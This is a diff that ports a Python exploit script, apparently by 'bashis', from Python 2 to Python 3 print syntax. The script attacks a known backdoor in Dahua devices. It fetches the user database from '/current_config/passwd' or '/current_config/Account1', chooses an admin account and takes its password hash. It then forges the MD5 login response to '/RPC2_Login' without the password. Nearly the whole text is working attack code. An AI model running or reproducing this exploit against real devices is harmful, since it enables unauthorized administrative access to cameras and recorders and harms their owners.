@@ -137,6 +137,7 @@
 # /bashis
 #
 
+from __future__ import print_function
 import string
 import sys
 import socket
@@ -170,17 +171,17 @@ class HTTPconnect:
 		url = '{}://{}{}'.format(self.proto, self.host, self.uri)
 
 		if self.verbose:
-			print "[Verbose] Sending:", url
+			print("[Verbose] Sending:", url)
 
 		if self.proto == 'https':
 			if hasattr(ssl, '_create_unverified_context'):
-				print "[i] Creating SSL Unverified Context"
+				print("[i] Creating SSL Unverified Context")
 				ssl._create_default_https_context = ssl._create_unverified_context
 
 		if self.credentials:
 			Basic_Auth = self.credentials.split(':')
 			if self.verbose:
-				print "[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1]
+				print("[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1])
 			try:
 				pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
 				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
@@ -188,7 +189,7 @@ class HTTPconnect:
 				opener = urllib2.build_opener(auth_handler)
 				urllib2.install_opener(opener)
 			except Exception as e:
-				print "[!] Basic Auth Error:",e
+				print("[!] Basic Auth Error:",e)
 				sys.exit(1)
 
 		if self.query_data:
@@ -198,7 +199,7 @@ class HTTPconnect:
 		response = urllib2.urlopen(request)
 #		print response
 		if response:
-			print "[<] {} OK".format(response.code)
+			print("[<] {} OK".format(response.code))
 
 		if self.Raw:
 			return response
@@ -226,7 +227,7 @@ class Dahua_Backdoor:
 		html = self.response.readlines()
 		if self.verbose:
 			for lines in html:
-				print "{}".format(lines)
+				print("{}".format(lines))
 		#
 		# Check for first availible admin user
 		#
@@ -237,13 +238,13 @@ class Dahua_Backdoor:
 			if line[3] == '1':		# Check if user is in admin group
 				USER_NAME = line[1]	# Save login name
 				PWDDB_HASH = line[2]# Save hash
-				print "[i] Choosing Admin Login [{}]: {}, PWD hash: {}".format(line[0],line[1],line[2])
+				print("[i] Choosing Admin Login [{}]: {}, PWD hash: {}".format(line[0],line[1],line[2]))
 				break
 
 		#
 		# Login 1
 		#
-		print "[>] Requesting our session ID"
+		print("[>] Requesting our session ID")
 		query_args = {"method":"global.login",
 			"params":{
 				"userName":USER_NAME,
@@ -256,12 +257,12 @@ class Dahua_Backdoor:
 
 		json_obj = json.load(response)
 		if self.verbose:
-			print json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': '))
+			print(json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': ')))
 
 		#
 		# Login 2
 		#
-		print "[>] Logging in"
+		print("[>] Logging in")
 
 		query_args = {"method":"global.login",
 			"session":json_obj['session'],
@@ -274,7 +275,7 @@ class Dahua_Backdoor:
 
 		URI = '/RPC2_Login'
 		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,json_obj['session'])
-		print response.read()
+		print(response.read())
 
 		#
 		# Wrong username/password
@@ -288,7 +289,7 @@ class Dahua_Backdoor:
 		#
 		# Logout
 		#
-		print "[>] Logging out"
+		print("[>] Logging out")
 		query_args = {"method":"global.logout",
 			"params":"null",
 			"session":json_obj['session'],
@@ -318,7 +319,7 @@ class Dahua_Backdoor:
 
 
 		if self.verbose:
-			print json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': '))
+			print(json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': ')))
 
 		#
 		# Check for first availible admin user
@@ -327,12 +328,12 @@ class Dahua_Backdoor:
 			if who['Group'] == 'admin':			# Check if user is in admin group
 				USER_NAME = who['Name']			# Save login name
 				PWDDB_HASH = who['Password']	# Save hash
-				print "[i] Choosing Admin Login: {}".format(who['Name'])
+				print("[i] Choosing Admin Login: {}".format(who['Name']))
 				break
 		#
 		# Request login
 		#
-		print "[>] Requesting our session ID"
+		print("[>] Requesting our session ID")
 		query_args = {"method":"global.login",
 			"params":{
 				"userName":USER_NAME,
@@ -345,7 +346,7 @@ class Dahua_Backdoor:
 
 		json_obj = json.load(response)
 		if self.verbose:
-			print json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': '))
+			print(json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': ')))
 		#
 		# Generate login MD5 hash with all required info we have downloaded
 		#
@@ -353,15 +354,15 @@ class Dahua_Backdoor:
 		PASS = ''+ USER_NAME +':' + RANDOM + ':' + PWDDB_HASH + ''
 		RANDOM_HASH = hashlib.md5(PASS).hexdigest().upper()
 
-		print "[i] Downloaded MD5 hash:",PWDDB_HASH
-		print "[i] Random value to encrypt with:",RANDOM
-		print "[i] Built password:",PASS
-		print "[i] MD5 generated password:",RANDOM_HASH
+		print("[i] Downloaded MD5 hash:",PWDDB_HASH)
+		print("[i] Random value to encrypt with:",RANDOM)
+		print("[i] Built password:",PASS)
+		print("[i] MD5 generated password:",RANDOM_HASH)
 
 		#
 		# Login
 		#
-		print "[>] Logging in"
+		print("[>] Logging in")
 
 		query_args = {"method":"global.login",
 			"session":json_obj['session'],
@@ -374,7 +375,7 @@ class Dahua_Backdoor:
 
 		URI = '/RPC2_Login'
 		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,json_obj['session'])
-		print response.read()
+		print(response.read())
 
 		# Wrong username/password
 		# { "error" : { "code" : 268632071, "message" : "Component error: password not valid!" }, "id" : 10000, "result" : false, "session" : 1156538295 }
@@ -387,7 +388,7 @@ class Dahua_Backdoor:
 		#
 		# Logout
 		#
-		print "[>] Logging out"
+		print("[>] Logging out")
 		query_args = {"method":"global.logout",
 			"params":"null",
 			"session":json_obj['session'],
@@ -482,14 +483,14 @@ if __name__ == '__main__':
 		arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
 		args = arg_parser.parse_args()
 	except Exception as e:
-		print INFO,"\nError: %s\n" % str(e)
+		print(INFO,"\nError: %s\n" % str(e))
 		sys.exit(1)
 
 	# We want at least one argument, so print out help
 	if len(sys.argv) == 1:
 		arg_parser.parse_args(['-h'])
 
-	print "\n[*]",INFO
+	print("\n[*]",INFO)
 
 	if args.verbose:
 		verbose = args.verbose
@@ -512,22 +513,22 @@ if __name__ == '__main__':
 
 	# Check if RPORT is valid
 	if not Validate(verbose).Port(rport):
-		print "[!] Invalid RPORT - Choose between 1 and 65535"
+		print("[!] Invalid RPORT - Choose between 1 and 65535")
 		sys.exit(1)
 
 	# Check if RHOST is valid IP or FQDN, get IP back
 	rhost = Validate(verbose).Host(rhost)
 	if not rhost:
-		print "[!] Invalid RHOST"
+		print("[!] Invalid RHOST")
 		sys.exit(1)
 
 #
 # Validation done, start print out stuff to the user
 #
 	if args.https:
-		print "[i] HTTPS / SSL Mode Selected"
-	print "[i] Remote target IP:",rhost
-	print "[i] Remote target PORT:",rport
+		print("[i] HTTPS / SSL Mode Selected")
+	print("[i] Remote target IP:",rhost)
+	print("[i] Remote target PORT:",rport)
 
 	rhost = rhost + ':' + rport
 
@@ -541,12 +542,12 @@ if __name__ == '__main__':
 	# Try to find /current_config/passwd user database (Generation 2)
 	#
 	try:
-		print "[>] Checking for backdoor version"
+		print("[>] Checking for backdoor version")
 		URI = "/current_config/passwd"
 		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,None,None)
-		print "[!] Generation 2 found"
+		print("[!] Generation 2 found")
 		reponse = Dahua_Backdoor(rhost,proto,verbose,creds,raw_request).Gen2(response,headers)
-		print response
+		print(response)
 	except urllib2.HTTPError as e:
 		#
 		# If not, try to find /current_config/Account1 user database (Generation 3)
@@ -555,19 +556,19 @@ if __name__ == '__main__':
 			try:
 				URI = '/current_config/Account1'
 				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,None,None)
-				print "[!] Generation 3 Found"
+				print("[!] Generation 3 Found")
 				response = Dahua_Backdoor(rhost,proto,verbose,creds,raw_request).Gen3(response,headers)
 			except urllib2.HTTPError as e:
 				if e.code == 404:
-					print "[!] Patched or not Dahua device! ({})".format(e.code)
+					print("[!] Patched or not Dahua device! ({})".format(e.code))
 					sys.exit(1)
 				else:
-					print "Error Code: {}".format(e.code)
+					print("Error Code: {}".format(e.code))
 	except Exception as e:
-		print "[!] Detect of target failed ({})".format(e)
+		print("[!] Detect of target failed ({})".format(e))
 		sys.exit(1)
 
-	print "\n[*] All done...\n"
+	print("\n[*] All done...\n")
 	sys.exit(0)
 
 
